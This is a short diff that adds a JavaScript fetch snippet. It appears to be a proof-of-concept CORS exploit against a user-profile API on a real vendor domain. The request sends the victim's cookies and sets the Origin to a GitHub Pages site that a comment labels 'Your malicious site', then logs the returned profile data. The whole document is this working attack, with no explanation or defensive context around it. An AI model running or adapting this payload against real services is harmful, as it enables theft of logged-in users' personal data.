@@ -1,0 +1,14 @@
+fetch('https://ovp.lenovo.com/dxp/api/sacs/v1/user/profile', {
+  method: 'GET',
+  headers: {
+    'Origin': 'https://nayssers.github.io',  // Your malicious site
+    'Accept': 'application/json',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'cross-site',
+    'Sec-Fetch-Dest': 'empty',
+  },
+  credentials: 'include'  // Important: include cookies in the request
+})
+.then(response => response.json())
+.then(data => console.log(data))
+.catch(error => console.error('Request failed', error));
